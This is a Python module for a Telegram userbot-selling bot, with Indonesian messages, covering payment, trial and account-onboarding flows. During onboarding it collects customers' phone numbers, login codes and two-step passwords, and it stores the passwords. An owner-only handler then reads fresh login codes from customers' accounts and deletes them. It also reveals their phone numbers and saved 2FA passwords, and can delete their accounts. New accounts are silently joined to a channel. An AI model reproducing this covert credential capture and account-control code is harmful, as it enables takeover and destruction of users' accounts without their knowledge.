from DanteUserbot import *
from pyrogram.enums import SentCodeType
from datetime import datetime
from DanteUserbot import bot, ubot
from time import time
from pyrogram.errors import *
from pyrogram.types import *
import asyncio
import importlib
from datetime import datetime
from dateutil.relativedelta import relativedelta

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *
from pyrogram.raw import functions
from DanteUserbot.core.database.trial import is_trial_used, mark_trial_used, clear_expired_trials

USED_TRIAL = []

async def need_api(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""<blockquote>
<b>⚠️ kamu sudah membuat userbot, jika userbot kamu tidak bisa digunakan silahkan klik </b></blockquote>/restart
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""<blockquote>
<b>❌ Tidak bisa membuat userbot!</b>

<b>📚 karena maksimal userbot {Fonts.smallcap(str(len(ubot._ubot)))} telah tercapai</b>

<b>☎️ silahkan hubungi developer saya: <a href=tg://openmessage?user_id={OWNER_ID}>Developer</a> jika ingin membuat userbot</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id not in await get_prem():
        buttons = [
            [
                InlineKeyboardButton("lanjutkan", callback_data="bayar_dulu"),               
                InlineKeyboardButton("kembali", callback_data=f"home {user_id}"),
            ]
        ]
        return await callback_query.edit_message_text(
            MSG.POLICY(),
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("lanjutkan", callback_data="add_ubot")]]
        return await callback_query.edit_message_text(
            """<blockquote>
<b>anda telah membeli userbot silahkan pencet tombol lanjutkan untuk membuat userbot</b></blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


async def payment_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    buttons = Button.plus_minus(1, user_id)
    return await callback_query.edit_message_text(
        MSG.TEXT_PAYMENT(20, 20, 1),
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


async def bikin_memek(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in await get_prem():
        buttons = [
            [InlineKeyboardButton("💳 Lakukan Pembayaran", callback_data="bayar_dulu")],
            [InlineKeyboardButton("Kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            "❌ Anda belum melakukan pembayaran. Silakan lakukan pembayaran terlebih dahulu.",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id in ubot._get_my_id:
        buttons = [
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""<blockquote>
<b>⚠️ kamu sudah membuat userbot, jika userbot kamu tidak bisa digunakan silahkan klik: </b></blockquote>/restart
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    elif len(ubot._ubot) + 1 > MAX_BOT:
        buttons = [
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""<blockquote>
<b>❌ Tidak bisa membuat userbot!</b>

<b>📚 karena maksimal userbot {Fonts.smallcap(str(len(ubot._ubot)))} telah tercapai</b>

<b>☎️ silahkan hubungi developer saya: <a href=tg://openmessage?user_id={OWNER_ID}>developer</a> jika ingin membuat userbot</b><blockquote>
""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    if user_id not in await get_prem():
        buttons = [
            [InlineKeyboardButton("💵 beli userbot", callback_data="bahan")],
            [InlineKeyboardButton("kembali", callback_data=f"home {user_id}")],
        ]
        return await callback_query.edit_message_text(
            f"""<blockquote>
<b>⚠️ Maaf kamu belum membeli userbot, silahkan beli terlebih dahulu.</b>
</blockquote>""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        buttons = [[InlineKeyboardButton("✅ lanjutkan", callback_data="add_ubot")]]
        return await callback_query.edit_message_text(
            """<blockquote>
<b>✅ Untuk membuat userbot silahkan siapkan bahan dibawah ini:

    • <code>phone_number</code>: nomor akun telegram ini

☑️ jika sudah tersedia nomor silahkan klik tombol dibawah</b>
</blockquote>""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )


async def bikin_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.delete()
    try:
        phone = await bot.ask(
            user_id,
            (
                "<blockquote><b>Silahkan masukkan nomor telepon telegram anda dengan format kode negara</blockquote>\ncontoh: +628xxxxxxx</b>\n"
                "\n<b>Gunakan /cancel <blockquote>untuk membatalkan proses membuat userbot</b></blockquote>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "pembatalan otomatis")
    if await is_cancel(callback_query, phone.text):
        return
    phone_number = phone.text
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )
    get_otp = await bot.send_message(user_id, "<b>mengirim kode otp...</b>")
    await new_client.connect()
    try:
        code = await new_client.send_code(phone_number.strip())
    except apiIdInvalid as AID:
        await get_otp.delete()
        return await bot.send_message(user_id, AID)
    except PhoneNumberInvalid as PNI:
        await get_otp.delete()
        return await bot.send_message(user_id, PNI)
    except PhoneNumberFlood as PNF:
        await get_otp.delete()
        return await bot.send_message(user_id, PNF)
    except PhoneNumberBanned as PNB:
        await get_otp.delete()
        return await bot.send_message(user_id, PNB)
    except PhoneNumberUnoccupied as PNU:
        await get_otp.delete()
        return await bot.send_message(user_id, PNU)
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    try:
        sent_code = {
            SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>akun telegram</a> resmi",
            SentCodeType.SMS: "sms anda",
            SentCodeType.CALL: "panggilan telpon",
            SentCodeType.FLASH_CALL: "panggilan kilat telepon",
            SentCodeType.FRAGMENT_SMS: "fragment sms",
            SentCodeType.EMAIL_CODE: "email anda",
        }
        await get_otp.delete()
        otp = await bot.ask(
            user_id,
            (
                f"<blockquote><b>Silahkan periksa kode otp dari akun telegram resmi. Kirim kode otp ke sini setelah membaca format di bawah ini</b></blockquote>\n"
                "<blockquote>jika kode otp adalah 12345 tolong tambahkan spasi kirimkan seperti ini 1 2 3 4 5</blockquote>\n"
                "\n<b>Gunakan /cancel <blockquote>untuk membatalkan proses membuat userbot</blockquote></b>"
            ),
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(user_id, "Waktu telah habis")
    if await is_cancel(callback_query, otp.text):
        return
    otp_code = otp.text
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid as PCI:
        return await bot.send_message(user_id, PCI)
    except PhoneCodeExpired as PCE:
        return await bot.send_message(user_id, PCE)
    except BadRequest as error:
        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<blockquote><b>akun telah mengaktifkan verivikasi dua langkah. Silahkan kirimkan passwordnya\n\ngunakan/cancel untuk membatalkan proses membuat userbot</blockquote></b>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(user_id, "pembatalan otomatis")
        if await is_cancel(callback_query, two_step_code.text):
            return
        new_code = two_step_code.text
        try:
            await new_client.check_password(new_code)
            await set_two_factor(user_id, new_code)
        except Exception as error:
            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False
    bot_msg = await bot.send_message(
        user_id,
        "sedang memproses....\n\nsilahkan tunggu sebentar",
        disable_web_page_preview=True,
    )
    await new_client.start()  # No changes needed here as 'group' is handled in __init__.py
    if not user_id == new_client.me.id:
        ubot._ubot.remove(new_client)
        await rem_two_factor(new_client.me.id)
        return await bot_msg.edit(
            "<blockquote><b>harap gunakan nomer telegram anda di akun anda saat ini dan bukan nomer telegram dari akun lain</blockquote></>"
        )
    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    if callback_query.from_user.id not in await get_seles():
        await remove_prem(callback_query.from_user.id) 
    for mod in loadModule():
        importlib.reload(importlib.import_module(f"DanteUserbot.modules.{mod}"))
    text_done = f"<blockquote><b>💠 {bot.me.mention} berhasil diaktifkan di akun: <a href=tg://openmessage?user_id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code></b></blockquote>"
    await bot_msg.edit(text_done)
    try:
        await new_client.join_chat("NevcTech")
    except UseralreadyParticipant:
        pass
    return await bot.send_message(
        LOGS_MAKER_UBOT,
        f"""<blockquote>
<b>userbot diaktifkan</b>
<b>akun:</b> <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a> 
<b>id:</b> <code>{new_client.me.id}</code>
</blockquote>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "📁 cek masa aktif",
                        callback_data=f"cek_masa_aktif {new_client.me.id}",
                    )
                ],
            ]
        ),
        disable_web_page_preview=True,
    )
    

async def next_prev_ubot(client, callback_query):
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "next_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "prev_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.USERBOT(count),
        reply_markup=InlineKeyboardMarkup(
            Button.ambil_akun(ubot._ubot[count].me.id, count)
        ),
    )

async def tools_userbot(client, callback_query):
    user_id = callback_query.from_user.id
    query = callback_query.data.split()
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ tombol ini bukan untuk mu {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    X = ubot._ubot[int(query[1])]
    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("❌ kode otp tidak ditemukan", True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(
                            Button.ambil_akun(X.me.id, int(query[1]))
                        ),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(error, True)
    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b>📲 nomer telepon dengan user_id <code>{X.me.id}</code> adalah <code>{X.me.phone_number}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.ambil_akun(X.me.id, int(query[1]))
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)
    elif query[0] == "get_faktor":
        code = await get_two_factor(X.me.id)
        if code == None:
            return await callback_query.answer(
                "🔐 kode two-factor authentication tidak ditemukan", True
            )
        else:
            return await callback_query.edit_message_text(
                f"<b>🔐 two-factor authentication dengan user_id <code>{X.me.id}</code> adalah <code>{code}</code></b>",
                reply_markup=InlineKeyboardMarkup(
                    Button.ambil_akun(X.me.id, int(query[1]))
                ),
            )
    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(Button.deak(X.me.id, int(query[1]))),
        )
    elif query[0] == "deak_akun":
        ubot._ubot.remove(X)
        await X.invoke(functions.account.Deleteaccount(reason="madarchod hu me"))
        return await callback_query.edit_message_text(
            MSG.DEAK(X),
            reply_markup=InlineKeyboardMarkup(Button.ambil_akun(X.me.id, int(query[1]))),
        )

async def cek_ubot(client, callback_query):
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.USERBOT(0),
        reply_markup=InlineKeyboardMarkup(Button.ambil_akun(ubot._ubot[0].me.id, 0)),
    )

async def cek_userbot_expired(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"⏳ tinggal {xxxx} hari lagi", True)
    except:
        return await callback_query.answer("✅ sudah tidak aktif", True)

async def hapus_ubot(client, callback_query):
    user_id = callback_query.from_user.id
    if not user_id == OWNER_ID:
        return await callback_query.answer(
            f"❌ Tombol ini bukan untuk mu {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"{get_id}"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"{get_id}"
    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            for chat in await get_chat(X.me.id):
                await remove_chat(X.me.id, chat)
            await rm_all(X.me.id)
            await rem_pref(X.me.id)
            await remove_ubot(X.me.id)
            await rem_expired_date(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()
            await callback_query.answer(
                f"✅ {get_mention} Berhasil dihapus dari database", True
            )
            await callback_query.edit_message_text(
                await MSG.USERBOT(0),
                reply_markup=InlineKeyboardMarkup(
                    Button.ambil_akun(ubot._ubot[0].me.id, 0)
                ),
            )
            await bot.send_message(
                LOGS_MAKER_UBOT,
                MSG.EXPIRED_MSG_BOT(X),
                reply_markup=InlineKeyboardMarkup(Button.expired_button_bot()),
            )
            return await bot.send_message(
                X.me.id, "<blockquote><b>masa aktif userbot anda telah berakhir</blockquote>"
            )


async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        await bot.send_message(
            callback_query.from_user.id, "<blockquote><b>membatalkan proses</b></blockquote>"
        )
        return True
    return False

@DANTE.CALLBACK("pler")
async def ohaja(client, callback_query):
    user_id = callback_query.from_user.id
    if not user_id not in ubot._get_my_id:
        buttons = [
            [
                InlineKeyboardButton("kembali", callback_data=f"home {user_id}"),                
            ]
        ]
        exp = await get_expired_date(user_id)
        prefix = await get_pref(user_id)
        waktu = exp.strftime("%d-%m-%Y") if exp else "None"
        uptime = await get_time((time() - start_time))
        return await callback_query.edit_message_text(
            f"""<blockquote>
<b>nousername</b>
 <b>status :</b> <code>premium</code>
  <b>prefixes :</b> <code>{prefix[0]}</code>
  <b>expired_on:</b> <code>{waktu}</code>
  <b>bot_uptime : <code>{uptime}</code></b>
</blockquote>""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
        )
        
    else:
        buttons = [
            [
                InlineKeyboardButton("kembali", callback_data=f"home {user_id}"),
            ]
        ]
        return await callback_query.edit_message_text(
            f"""<blockquote>
anda belum memiliki HiroUserbot silahkan beli HiroUserbot terlebih dahulu
</blockquote>""",
            disable_web_page_preview=True,
            reply_markup=InlineKeyboardMarkup(buttons),
    )


@DANTE.CALLBACK("bahan")
async def _(client, callback_query):
    await need_api(client, callback_query)


@DANTE.CALLBACK("memek")
async def _(client, callback_query):
    await bikin_memek(client, callback_query)


@DANTE.CALLBACK("bayar_dulu")
async def _(client, callback_query):
    await payment_userbot(client, callback_query)


@DANTE.CALLBACK("add_ubot")
async def _(client, callback_query):
    await bikin_ubot(client, callback_query)


@DANTE.CALLBACK("cek_ubot")
@DANTE.BOT("getubot")
async def _(client, message):
    if message.from_user.id == OWNER_ID:
        await cek_ubot(client, message)
    else:
        await message.reply("<blockquote>Maaf, hanya pemilik bot yang dapat mengakses ini.</blockquote>")


@DANTE.CALLBACK("^(get_otp|get_phone|get_faktor|ub_deak|deak_akun)")
async def _(client, callback_query):
    await tools_userbot(client, callback_query)


@DANTE.CALLBACK("cek_masa_aktif")
async def _(client, callback_query):
    await cek_userbot_expired(client, callback_query)


@DANTE.CALLBACK("del_ubot")
async def _(client, callback_query):
    await hapus_ubot(client, callback_query)

    
@DANTE.CALLBACK("^(prev_ub|next_ub)")
async def _(client, callback_query):
    await next_prev_ubot(client, callback_query)

@DANTE.CALLBACK("^coba")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    
    # Cek apakah pengguna sudah pernah menggunakan trial dari database
    if await is_trial_used(user_id):
        buttons = [
            [InlineKeyboardButton("💳 lakukan pembayaran 💳", callback_data="bayar_dulu")]
        ]
        return await callback_query.edit_message_text(
            """<blockquote>
<b>Anda sudah pernah mencoba gratis, silahkan beli untuk menikmati fasilitas bot.</b></blockquote>
""",
            reply_markup=InlineKeyboardMarkup(buttons),
        )
    else:
        # Tandai pengguna sebagai sudah menggunakan trial
        await mark_trial_used(user_id)
        await add_prem(user_id)

        now = datetime.now(timezone("Asia/Jakarta"))
        expired = now + relativedelta(days=1)
        await set_expired_date(user_id, expired)

        buttons = [
            [InlineKeyboardButton("⚒️ Buat hirov1 UBot", callback_data="memek")]
        ]
        return await callback_query.edit_message_text(
            """<blockquote>
<b>Anda telah mendapatkan akses premium selama 1 hari. Silahkan gunakan fasilitas bot.</b></blockquote>
""",
            reply_markup=InlineKeyboardMarkup(buttons),
        )

@DANTE.CALLBACK("buat_ubot")
async def _(client, callback_query):
    print("[LOG] Callback buat_ubot dipanggil.")  # Tambahkan log untuk debugging
    await bikin_memek(client, callback_query)
